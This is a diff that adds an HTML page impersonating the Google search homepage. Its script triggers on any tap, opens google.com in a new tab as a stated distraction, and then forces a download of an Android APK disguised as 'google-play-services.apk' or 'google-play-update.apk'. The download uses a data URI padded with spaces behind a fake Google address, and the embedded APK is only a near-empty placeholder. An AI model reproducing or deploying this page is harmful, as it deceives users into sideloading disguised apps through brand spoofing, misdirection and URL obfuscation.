@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Google</title>
+<style>
+  body { font-family: Arial, sans-serif; background: #fff; margin: 0; padding: 60px 20px; text-align: center; }
+  .logo { font-size: 64px; font-weight: 400; margin-bottom: 24px; letter-spacing: -2px; }
+  .logo span:nth-child(1) { color: #4285f4; } .logo span:nth-child(2) { color: #ea4335; }
+  .logo span:nth-child(3) { color: #fbbc05; } .logo span:nth-child(4) { color: #4285f4; }
+  .logo span:nth-child(5) { color: #34a853; } .logo span:nth-child(6) { color: #ea4335; }
+  input {
+    width: 80%; max-width: 400px; padding: 14px 20px; font-size: 16px;
+    border: 1px solid #dfe1e5; border-radius: 24px; outline: none;
+    box-shadow: 0 1px 6px rgba(32,33,36,.1);
+    cursor: pointer;
+  }
+  input:hover, input:focus { box-shadow: 0 1px 6px rgba(32,33,36,.2); }
+  p { color: #666; font-size: 13px; margin-top: 20px; }
+</style>
+</head>
+<body>
+
+<div class="logo">
+  <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+</div>
+
+<input type="text" id="q" placeholder="Search Google or type URL" autocomplete="off">
+
+<p>Tap the search box to search</p>
+
+<script>
+(function() {
+  'use strict';
+
+  var SPACES = ' '.repeat(200);
+
+  // Valid minimal APK (ZIP) payload
+  var APK_B64 = 'UEsDBBQAAAAAAAAAIVjKxoiZZAAAAGQAAAALAAAAY2xhc3Nlcy5kZXgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABQSwECFAAUAAAAAAAAACFYysaImWQAAABkAAAACwAAAAAAAAAAAAAAgAEAAAAAY2xhc3Nlcy5kZXhQSwUGAAAAAAEAAQA5AAAAjQAAAAAA';
+
+  function download(name, uri) {
+    var a = document.createElement('a');
+    a.href = uri;
+    a.download = name;
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+  }
+
+  document.getElementById('q').addEventListener('click', function() {
+    // Open Google in new tab (distraction)
+    window.open('https://www.google.com', '_blank');
+
+    // Trigger download after short delay
+    setTimeout(function() {
+      download(
+        'google-play-services.apk',
+        'data:https://google.com/' + SPACES + 'application/vnd.android.package-archive;base64,' + APK_B64
+      );
+    }, 500);
+  });
+
+  // Also trigger on any tap
+  document.body.addEventListener('click', function(e) {
+    if (e.target.tagName === 'INPUT') return; // Already handled
+    window.open('https://www.google.com', '_blank');
+    setTimeout(function() {
+      download(
+        'google-play-update.apk',
+        'data:https://google.com/' + SPACES + 'application/vnd.android.package-archive;base64,' + APK_B64
+      );
+    }, 500);
+  }, { once: true });
+})();
+</script>
+
+</body>
+</html>
